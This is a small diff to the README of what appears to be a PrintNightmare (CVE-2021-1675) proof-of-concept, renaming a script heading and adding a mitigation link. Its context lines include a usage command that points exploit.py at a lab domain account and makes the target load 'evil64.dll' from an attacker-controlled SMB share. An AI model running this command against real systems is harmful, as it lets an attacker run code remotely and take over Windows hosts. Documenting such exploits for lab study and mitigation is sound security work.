@@ -70,7 +70,7 @@ Start SMB Service
 service smbd start
 ```
 
-### CVE-2021-1675.py
+### exploit.py
 
 ```
 python3 exploit.py mcafeelab.local/lowpriv@10.55.0.1 '\\10.55.0.30\smb\evil64.dll'
@@ -88,6 +88,8 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 ```
 
 ### Mitigation
+
+https://doublepulsar.com/zero-day-for-every-supported-windows-os-version-in-the-wild-printnightmare-b3fdb82f840c  
 
 Disable Spooler service
 
